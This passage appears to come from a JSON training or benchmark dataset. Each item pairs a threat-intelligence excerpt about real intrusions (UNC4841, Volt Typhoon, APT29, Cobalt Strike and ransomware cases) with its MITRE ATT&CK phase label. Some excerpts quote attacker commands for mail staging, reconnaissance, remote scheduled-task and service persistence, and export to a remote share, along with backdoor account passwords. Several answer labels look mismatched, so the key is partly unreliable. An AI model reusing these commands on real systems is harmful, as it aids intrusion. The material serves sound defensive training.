        "input": "Described attack activity: Evidence of data staging and exfiltration of email related data by UNC4841 was observed in a subset of impacted ESG appliances. In the majority of   \ncases, UNC4841 staged the data in .tar.gz files in the /mail/tmp/ directory and utilized a consistent file naming convention containing 3 letters   \ncorresponding to the victim organization followed by a number such as 001. \nOnce staged, UNC4841 leveraged openssl to exfiltrate the .tar.gz file to attacker controlled infrastructure. An example of a command leveraged for exfiltration of the staged data can be seen as follows: \nIn addition, on a limited number of Email Security Gateway (ESG) appliances, Mandiant recovered shell scripts utilized by UNC4841 that conducted searches of the \"mstore\" for emails matching specific users or email domains and then staged the results for exfiltration. The \"mstore\" is the location in which email messages are temporarily stored on the appliance. This activity differs from other email collection activities by UNC4841 as it represents targeted collection of email data based on specific individuals or organizations. The targets identified at the account level included well known academics in Taiwan and Hong Kong as well as Asian and European government officials in Southeast Asia. \nThe following script, 1.sh, was leveraged to search the \"mstore\" and stage user email for exfiltration: \n#!/bin/bash mkdir /usr/share/.uc/<REDACTED> grep -lrn '<REDACTED>@' /mail/msto mkdir /usr/share/.uc/<REDACTED> grep -lrn '<REDACTED>@' /mail/msto mkdir /usr/share/.uc/<REDACTED> grep -lrn '<REDACTED>@' /mail/msto mkdir /usr/share/.uc/<REDACTED> grep -lrn '<REDACTED>@' /mail/msto mkdir /usr/share/.uc/<REDACTED> grep -lrn '<REDACTED>@' /mail/msto \nIn a limited number of cases, Mandiant observed UNC4841 utilize the anonfiles file sharing service as a means of exfiltration. ",
        "output": "exfiltration",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In most cases, Volt Typhoon accesses compromised systems by signing in with valid credentials, the same way authorized users do. However, in a small number of cases, Microsoft has observed Volt Typhoon operators creating proxies on compromised systems to facilitate access. They accomplish this with the built-in netsh portproxy command. \nIn rare cases, they also use custom versions of open-source tools Impacket and Fast Reverse Proxy (FRP) to establish a C2 channel over proxy. \nCompromised organizations will observe C2 access in the form of successful signins from unusual IP addresses. The same user account used for these sign-ins may be linked to command-line activity conducting further credential access. Microsoft will continue to monitor Volt Typhoon and track changes in their activity and tooling. ",
        "output": "command and control",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors deployed several types of lateral movements over the course of the intrusion.\nThe first observed method was the use of a remote service using PowerShell which injected into winlogon.\nThe threat actors also leveraged SMB to send Cobalt Strike Beacon executables to $ADMIN shares and again execute them on the remote systems via a service.SMB Beaconas its called in Cobalt Strike.\nPass the Hash was also used by the attackers while pivoting through the environment.\nRDP was also leveraged by the attacker via their Cobalt Strike Beacons.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We could not identify the initial compromise vector for the BlackCat attack. It is likely that the attack happened on a system not monitored by Cisco Talos telemetry or that a previously compromised account was used to log into an exposed system. \nThere was evidence in the BlackMatter attack that the actor established initial access via the possible exploitation of Microsoft Exchange vulnerabilities. However, we could not directly tie attempts of exploiting vulnerabilities in Microsoft Exchange to the attack and, for this reason, we assess with low confidence that the attack may have started with the exploitation of a vulnerability in Exchange. ",
        "output": "initial access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After AdFind had finished executing, the results were archived utilizing 7-Zip.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Local accounts\nTwo files were created by threat actors in order to create a new local user and add it to the local administrators group and Remote Desktop Users group. During the intrusion we did not observe them being executed, but since the threat actor dropped them we can assess that these are often used during their intrusion activity.\nThe first file, newuser.bat, uses WMIC to get the Local Administrators Group and Remote Desktop Users group names using the corresponding SIDs.\nIt then creates a user named sys with a password Taken1918 and adds it to these groups.\nnewuser.bat\nThe second script does similar activity but instead it uses the hardcoded group names.\nOne interesting thing is the creation of the registry value Support underHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserListwhich will hide the account Support account from the login screen. The script also creates a user named Support with a password of Kawa72ws. It also sets all local accounts to a max password age of unlimited.\nnewnewuser.bat\nRun Keys\nAfter being run, Trigona creates a new value under the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key.\nIt ensures that the ransomware will be executed each time the victim user logs in.\nAs we can see below, the APIs RegOpenKeyW and RegSetValueExW are used to set the registry value:\nA new value randomly named will be added, pointing to the current location of the ransomware being executed:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ExploitedthevulnerabilityCVE-2024-4577andexecuted commands in the PHP code to gain initial access. Runs PowerShell script to execute Cobalt Strike reverse HTTP shellcodepayload. ",
        "output": "initial access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the intrusion, the threat actors were observed accessing collected data such as ShareFinder.txt using Notepad and then copying the contents to the clipboard.\nWhilst the process activity indicated Active Directory accounts being used, correlating this activity to Clipboard activity indicated matching sessions, process IDs, and the true source of the user.\nIn this case, ShareFinder.txt was created in the ProgramData folder by the ShareFinder.ps1 script. Approximately 2 seconds later, the threat actors accessed this file and copied the contents.\nWhile the threat actors made attempts to proxy RDP traffic and minimize external RDP access, the threat actors' workstation was revealed in several Windows logs. Sysmon Event ID 24 linked the threat actors host name HYPERV and the IPv4 address of 199.101.184[.]230. This host name was also in the Security events:\nFor example, Event 4779 relating to a user disconnecting from a terminal session, reveals the client name of the source workstation. The client address was the internal workstation where the RDP traffic was being proxied through.\nExfiltrated Documents Opened Remotely\nDuring the second day of the intrusion, documents from the organization were opened remotely from 212.102.59[.]162 and 165.231.182[.]14. This occurred before Rclone was used, which leads us to believe the documents were exfiltrated over one of the encrypted C2 channels.\nRclone\nOn the backup server, rclone.exe was used in order to exfiltrate data to a MEGA cloud storage.\nFrom the rclone.exe configuration file, we can retrieve the user's mail address and password.\nMega user account:",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cyclops Blink uses OpenSSL (version 1.0.1f) to support C2 communication underneath TLS. Each time the malware beacons it randomly selects a destination from the current list of C2 server IPv4 addresses and hard-coded list of C2 ports. \nBeacons consist of queued messages containing data from running modules. Each message is individually encrypted using AES-256-CBC. The OpenSSL_EVP_SealInit function is used to randomly generate the encryption key and IV for each message, and then encrypt them using the hard-coded RSA public key. \nThe OpenSSL_RSA_public_decrypt function is used to decrypt tasking, received in response to beacons, using the hard-coded RSA public key. The decrypted command is expected to be formatted as follows: \nThe core component responds to the following commands: ",
        "output": "command and control",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: UNC4466 leveraged SOCKS5 tunneling to communicate with compromised systems in the victim network. This technique is typically used to evade network defenses or other preventative network controls. Two separate tools were deployed to execute this technique, LIGOLO and REVSOCKS. ",
        "output": "command and control",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Lateral movement was most often accomplished using valid credentials from compromised accounts and/or attacker-created accounts in combination with built-in protocols, such as RDP, SSH, or SMB. Many incidents involved a combination of multiple commands, software, tools, and utilities for lateral ",
        "output": "lateral movement",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1047: Windows Management Instrumentation   \nT1053: Scheduled Task/Job   \nT1053.005: Scheduled Task   \nT1059: Command and Scripting Interpreter   \nT1059: PowerShell   \nT1059.003: Windows Command Shell \nT1059.007: JavaScript T1204.001: Malicious Link T1204.002: Malicious File T1569.002: Service Execution ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once APT29 established access, Mandiant observed the group performing extensive reconnaissance of hosts and the Active Directory environment. The group was also observed conducting on-host reconnaissance looking for credentials. \nOne of the first commands employed by the group was the windows net command. APT29 was \nTracking APT29 Phishing Campaigns | Atlassian Trello | Google Cloud Blog observed using the net command widely to enumerate users and groups. \nnet use net localgroup Administrators net1 localgroup Administrators net user /domain <redacted> net group /domain \"Enterprise Admins\" \nAPT29 was also observed by Mandiant using nltest to enumerate Domain Controllers on the domain: \nC:\\\\WINDOWS\\\\system32\\\\cmd.exe /C nltest \nOne notable TTP observed by APT29 was the hunting for passwords stored in SYSVOL. This technique relies on passwords that are stored as part of Group Policy Preferences. Passwords stored in this way are encrypted using a known scheme that can easily be decrypted. Microsoft fixed this in MS14-025 which removed the option of configuring Group Policy Preferences with the \"cpassword\". While the patch was issued in 2014 it is still possible to come across systems with passwords stored in Group Policy Preferences, either due to the patch never having been applied or because the patch does not remove existing Group Policy Preferences \nTracking APT29 Phishing Campaigns | Atlassian Trello | Google Cloud Blog that contain passwords (as Microsoft does not risk breaking existing functionality). ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: reconnaissance activity using built-in Windows commands to gather information on the compromised server, rounding out the initial reconnaissance phase: \nsysteminfo net start net user dir c:\\ ",
        "output": "other",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In several instances, analysis identified Unit 29155 cyber actors compressing victim data [T1560] (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure. These cyber actors commonly use the command-line program Rclone to exfiltrate data to a remote location from victim infrastructure. \nUnit 29155 cyber actors have exfiltrated Windows processes and artifacts, such as Local Security Authority Subsystem Service (LSASS) memory dumps [T1003.001], Security Accounts Manager (SAM) files [T1003.002], and SECURITY and SYSTEM event log files [T1654]. As seen in victim incident response results, actor infrastructure has also been used to compromise multiple mail servers [T1114] and exfiltrate mail artifacts, such as email messages, using PowerShell [T1059.001] via the following command: \npowershell New-MailboxExportRequest  Mailbox <resource>  FilePath \\`\\\\{IP Address}\\sharefolder\\1.pst\\` ",
        "output": "exfiltration",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Quasar allows the tool user to escalate the client's running privileges, as seen in the source code shown in figure 5. To escalate the client's running privileges, Quasar attempts to launch a command prompt (cmd.exe) as an administrator. The elevated command prompt then relaunches the client. The client inherits the parent process' now-elevated privileges. If the Window's User Account Control (UAC) is configured, this method generates a UAC pop-up window on the target host, which asks the target host user to confirm the process of running the command prompt as the administrator. \nWindowsAccountHelper.GetAccountType() != \"Admin\") { ProcessStartInfo processStartInfo $=$ new ProcessStartInfo { FileName $=$ \"cmd\", Verb $=$ \"runas\", Arguments $=$ \"/k START \\\"\\\" \\\"\" $^+$ ClientData.CurrentPath $^+$ \"\\\" & EXIT\", \nWindowStyle $=$ ProcessWindowStyle.Hidden, UseShellExecute $=$ true }; ",
        "output": "privilege escalation",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We found approximately 70 different victims (organizations that were confirmed to be compromised) spread across 23 different countries. Since we had access to some of Earth Krahang's logs, we were also able to identify 116 different targets (including those that were not confirmed to be compromised) in 35 countries.\nIn total, the threat actor was able to compromise or target victims in 45 different countries spread across different regions, most of them in Asia and America, but also in Europe and Africa.\nGovernment organizations seem to be Earth Krahang's primary targets. As an example, in the case of one country, we found that the threat actor compromised a diverse range of organizations belonging to 11 different government ministries.\nWe found that at least 48 government organizations were compromised, with a further 49 other government entities being targeted. Foreign Affairs ministries and departments were a top target, compromising 10 such organizations and targeting five others.\nEducation is another sector of interest to the threat actor. We found at least two different victims and 12 targets belonging to this sector. The communications industry was also targeted; we found multiple compromised telecommunications providers. Other target organizations and entities include post offices (targeted in at least three different countries), logistics platforms, and job services.\nThere were other industries targeted, but on a smaller scale, including the following:\nFinance/Insurance \nFoundations/NGOs/Thinkthanks \nHealthcare \nIT \nManufacturing \nMedia \nMilitary \nReal estate \nRetail \nSports \nTourism",
        "output": "other",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In order to obtain SYSTEM level privileges, Cobalt Strike's built-in named piped impersonation (GetSystem) was used:",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Process injection was observed during the intrusion by both IcedID and Cobalt Strike. On one system, the threat actor injected into the winlogon process.\nCobalt Strike Processes Identified by in MemoryYara Scanning.\nVolatility Malfind output shows the embedded MZ header in the winlogon process with the settingPAGE_EXECUTE_READWRITEprotection settings on the memory space, a commonly observed attribute of process injection.\nNetwork connections to the Cobalt Strike server by winlogon were also observed in the process logs.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1074.001: Local Data Staging T1560: Archive Collected Data T1560.001:    Archive via Utility ",
        "output": "collection",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: With an established modus operandi for UNC1878, our team quickly identified several related intrusions in support of FireEye Mandiant investigations over the next week. Within two days of our initial clustering and expansion of UNC1878 from the original Managed Defense investigation, Mandiant Incident Responders were investigating activity at a U.S. based medical equipment company with several indicators we had previously identified and attributed to UNC1878. Attributed domains, payloads and methodologies provided consultants with a baseline to build detections on, as well as a level of \nIt's Your Money and They Want It Now - The Cycle of Adversary Pursuit | Mandiant | Google Cloud Blog confidence in the actor's capabilities and speed in which they operate. \nThree days later, UNC1878 was identified during another incident response engagement at a restaurant chain. In this engagement, Mandiant consultants found evidence of attempted deployment of RYUK ransomware on hundreds of systems, finally revealing UNC1878's desired end goal. In the following weeks, we continued to encounter UNC1878 in various phases of their intrusions at several Mandiant Incident Response and Managed Defense customers. \nWhile services data offers us a depth of understanding into these intrusions, we turn to our product telemetry to understand the breadth of activity, getting a better worldview and perspective on the global prevalence of this threat actor. This led to the discovery of an UNC1878 intrusion at a technology company, resulting in Mandiant immediately notifying the affected customer. By correlating multiple UNC1878 intrusions across our services and product customers, it became evident that the targeting was indiscriminate, a common characteristic of opportunistic ransomware campaigns. \nAlthough initially there were unanswered questions surrounding UNC1878's intent, we were able to provide valuable insights into their capabilities to our consultants and analysts. In turn, the intrusion data gathered during these engagements continued the cycle of building our understanding of UNC1878's tradecraft, enabling our responders to \nIt's Your Money and They Want It Now - The Cycle of Adversary Pursuit | Mandiant | Google Cloud Blog handle these incidents swiftly in the face of imminent ransomware deployment. ",
        "output": "discovery",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1027: Obfuscated Files or InformationT1027.005:   \nIndicator Removal from ToolsT1036:   \nMasqueradingT1055: Process InjectionT1055.002:   \nPortable Executable InjectionT1070.001: Clear   \nWindows Event LogsT1070.004: File   \nDeletionT1070.005: Network Share Connection   \nRemovalT1070.006: TimestompT1078: Valid   \nAccountsT1112: Modify RegistryT1127.001:   \nMSBuildT1134: Access Token ManipulationT1134.001:   \nToken Impersonation/TheftT1140:   \nDeobfuscate/Decode Files or InformationT1202:   \nIndirect Command ExecutionT1218.005:   \nMshtaT1218.011: Rundll32T1497:   \nVirtualization/Sandbox EvasionT1497.001: System   \nChecksT1553.002: Code SigningT1562.001: Disable   \nor Modify ToolsT1562.004: Disable or Modify   \nSystem FirewallT1564.003: Hidden WindowT1620:   \nReflective Code Loading ",
        "output": "defense evasion",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Bazar relies on user execution of an executable to run. This user was a Domain User and did not have any other permissions.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A new BITS job, named \"Microsoft Office Manager upgrade v24.24\" was created on the beachhead host.\nThe BITS job failed because the requested URL does not exist.\nWhile reporting failure in the logs, the BITS job did re-execute the mounted ISO files every 3 hours, for the length of the intrusion on the beachhead host.\nAfter the threat actor moved laterally, we observed them installing Anydesk on multiple clients to create additional means of keeping access.\nThey used PowerShell and cmd to automate the download and installation of AnyDesk. In order to install Anydesk for unattended access you have to set a password. The password here was set toJ9kzQ2Y0qO\nThe threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.\nThis password also matches one from the leakedConti manualsback in August.\nFrom the Anydesk logs, we can also see the Client-ID and the IP used to access the clients. Logs can be found at %programdata%\\AnyDesk\\ad_svc.trace",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Thanks to@James_inthe_boxfor the sample!\nAs with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload. The user is presented with the following:\nReviewing the file we can observe that the filetype while labeled as a .doc file appears as XML when reviewing the file attributes.\nA deeper inspection shows the Word 2003 XML formatting and the contained macro.\nOnce the macro has been enabled, in the next stage, an HTML Application (HTA) file is created and dropped into the user's folder:\nFollowed by the execution of the HTA:\nAnalysis of the HTA file shows a mix of encoded HTML and JavaScript/VBScript code, not to mention profanity at the start of the file.\nThe base64 encoded string can be decoded to:\nThe code downloads a binary file (compareForfor.jpg) masquerading as a JPG (Image file) from millscruelg[.]com to the following folder \"c:\\users\\public\", and incorporating VBScript code, utilizes REGSVR32 to execute this DLL.\nThis initiates a connection to 64.227.65[.]60:443 and invokes a Svchost.exe, followed by a lookup to myexternalip[.]com to retrieve the external public-facing IPv4 address of the network. The attacker could use this information to verify the network being targeted and/or to facilitate tool configuration. Two DLLs were loaded via RunDll32 using the Svchost process. The first was D574.dll:\nFollowed by D8B3.dll:\nD8B3.dll injected into the Winlogon process (high integrity):\nIn the case of D8B3.dll, the DLL was Go compiled. Both DLLs had invalid certificates and could be detected by checking for any failed/revoked status.:\nAdditionally, each DLL had no populated metadata relating to the DLL:\nThe process hierarchy tree visualization below:\nThis is very similar to the Bazarloaderanalysis by Brad Duncanon 11/08/2021.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Taidoor malware has been used to successfully compromise targets since 2008. This threat has evolved over time, and has recently leveraged Yahoo Blogs as a mechanism to drop the Taidoor malware as a \"second stage\" component. In addition, the well-known Taidoor network traffic pattern has been modified, likely as a new way to avoid networkbased detection. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Formjacking\nVictims may not realize they are victims of formjacking as generally their websites continue to operate as normal, and attackers like Magecart are sophisticated and stealthy and take steps to avoid detection.\nWebsite owners should be aware of the dangers of software supply chain attacks, as these have been used as the infection vector in some of these formjacking attacks. Software supply chain attacks can be difficult to guard against, but there are some steps that website owners can take:\nTest new updates, even seemingly legitimate ones, in small test environments or sandboxes first, to detect any suspicious behavior.\nBehavior monitoring of all activity on a system can also help identify any unwanted patterns and allow you to block a suspicious application before any damage can be done.\nProducers of software packages should ensure that they are able to detect unwanted changes in the software update process and on their website.\nWebsite owners can also use content security policieswith Subresource Integrity tags (SRI)to lock down any integrated third-party script.\nPoint of Sale\nInstall and maintain a firewall to facilitate network segmentation.\nChange default system passwords and other security parameters.\nEncrypt transmission of cardholder data across open, public networks.\nUse and regularly update security software.\nUse strong authentication including two-factor authentication for remote systems.\nTest security systems, perform penetration testing, and implement a vulnerability management program.\nMaintain security policies and implement regular training for all personnel.\nImplement chip-and-PIN technology in your business.\nImplement system integrity and monitoring software to leverage features such as system lockdown, application control, or whitelisting.",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Except lsass.zip, no data exfiltration or staging have been observed during this intrusion.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Many web products have incorporated LLMs in their core services. However, they can generate harmful content if not properly controlled. To mitigate this risk, LLMs are trained with safety alignments to prevent the production of harmful content.\nHowever, these safety alignments can be bypassed through a process called LLM jailbreaking. This process involves crafting specific prompts (known as prompt engineering or prompt injection) to manipulate the model's output, and it leads the LLM to generate harmful content.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After gaining a foothold on the initial system, the attackers attempt to spread the malware to other computers on the enterprise network. To gain access to those computers, the attackers use network scanning results, as well as user credentials stolen earlier. \nThe Ladon hacking utility (which is popular in China) is used as the main lateral movement tool. It combines network scanning, vulnerability search and exploitation, password attack, and other functionality. The attackers also extensively use standard utilities that are part of the Microsoft Windows operating system. \nThe attack's final stage involves hijacking the domain controller and gaining full control of all of the organization's workstations and servers. \nThe attackers used DLL hijacking and process hollowing techniques extensively in the attack to prevent security software from detecting the malware. ",
        "output": "lateral movement",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 6 to further their credential access. ",
        "output": "credential access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The earliest sign of the threat actor's presence was the execution of a Cobalt Strike beacon, identified as RtWin64.exe. Despite thorough investigation, the initial access point for the beacon's deployment could not be determined.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor undertook multiple actions to obtain valid credentials, primarily leveraging Rubeus as the key tool. During our investigation, we discovered that Rubeus had been loaded into mstsc.exe-a process previously injected by Cobalt Strike-functioning as aCLR module.\nAS-REP roasting\nAS-REP roastingwas the first credential access activity performed by the threat actor. This was done with Rubeus on the beachhead host targeting a domain controller.\nRubeus writing the result of AS-REP roasting output to a file:\nIndications of AS-REP roasting can be found by looking for windows eventID 4768 on the target domain controller. The request is for Authentication tickets(TGT) with \"Pre-Authentication Type\" set to 0, meaning no password is required.\nA lot of Kerberos Authentication Tickets were requested during AS-REP Roasting:\nKerberoasting\nThe threat actor used Rubeus to conduct a Kerberoasting attack. During this period of time, we observed numerous Kerberos ticket requests, specifically using encryption type 0x17, which corresponds to RC4 encryption. These RC4 encryption requests coincided with the execution of Rubeus and targeted multiple accounts across the domain\nRubeus executed in memory by Cobalt Strike creating kerberoast output:\nEventID 4769 on a domain controller showing request for tickets with weak encryption:\nLSASS memory access\nThe threat actor accessed LSASS memory on a workstation with a specific access request of 0x1010, where 0x0010 is necessary to read memory using ReadProcessMemory. This request originated from a process that had been injected with Cobalt Strike.\nSysmon eventID 10 shows mstsc.exe accessing lsass with the access mask 0x1010",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.\nThe injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.\nOver-Pass-the-Hash from Beachhead\nThe threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hashto request a TGT from the domain controller.We have seen the use of over-pass-the-hash several times before. For example, ourCobalt Strike Defender Guidecovers detection of this technique in more detail.\nSoon after, a TGT for the administrator account was requested:",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The malware uses the same aforementioned string list with a random string to create a prefix, appends one to five random characters, and uses this value as the registry value name. \nThe malware configures persistence to one of the following two locations depending on its privileges: \n(HKCU|HKLM)\\SOFTWARE\\Microsoft\\Windows\\C urrentVersion\\Run (HKCU|HKLM)\\SOFTWARE\\Microsoft\\Windows\\C urrentVersion\\Policies\\Explorer\\Run ",
        "output": "persistence",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To ensure persistence in target systems, the attackers used Task Scheduler and created Windows services. \nScheduled Task/Job: At (Windows)  T1053.002 schtasks /create /s 192.168.111.3 /u {redacted} /p {redacted} /tn dda /sc onstart /tr C:\\PerfLogs\\vmserver64.exe /ru system /f SCHTASKS /Create /S 10.200.244.222 /U test\\administrator /P {redacted} /RU \"system\" /tn rlsv /sc DAILY /tr c:\\2012.bat /F SCHTASKS /Create /S 192.168.100.19 /U \"{redacted}\\administrator\" /P {redacted} /RU SYSTEM /SC DAILY /TN Exec2022 /TR \"C:\\windows\\system32\\taskhosts.exe\" schtasks /create /tn rlsv1 /U test\\Administrator /P {redacted} /tr C:\\2012.bat /sc DAILY /s 10.200.244.222 /RU system SCHTASKS /Create /RU SYSTEM /SC ONSTART /TN Update /TR \"C:\\windows\\system32\\calc.exe\" SCHTASKS /Create /RU SYSTEM /SC ONSTART /TN dllhosts /TR \"dllhosts.exe\" schtasks.exe /s 192.168.0.28 /u \"administrator\" /p {redacted} /Create /tn VMUSS /tr \"c:\\users\\public\\install.bat\" /st 15:58 /sc once /ru system \nSystem Services: Service Execution  T1543.003 \nsc \\\\172.26.16.81 Create SuperIe binPath= \"cmd.exe /k   \nc:\\users\\public\\SecurityHealthSystray.exe\" sc Create syscmd binpath=\"cmd/k start\"type= own type= interact sc \\\\192.168.111.112 create res binpath=\"C:\\PerfLogs\\vmserver.exe\" sc start LxpSrvc \nBoot or Logon Autostart Execution: Registry Run Keys / Startup Folder  T1547.001 \nIn some cases the threat actors placed their malicious files in the startup folder on remote computers, which made the files execute every time the victim's operating system was launched. ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Two hours after initial access, the threat actor utilized Cobalt Strike's credential dumping functionalities to access the LSASS process on the beachhead host. This provided them access to a shared local administrator account. Around two hours after that they landed on a server during lateral movement activity, the threat actor was seen accessing LSASS. After this we observed the use of a domain administrator account indicating this second access likely delivered those credentials.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
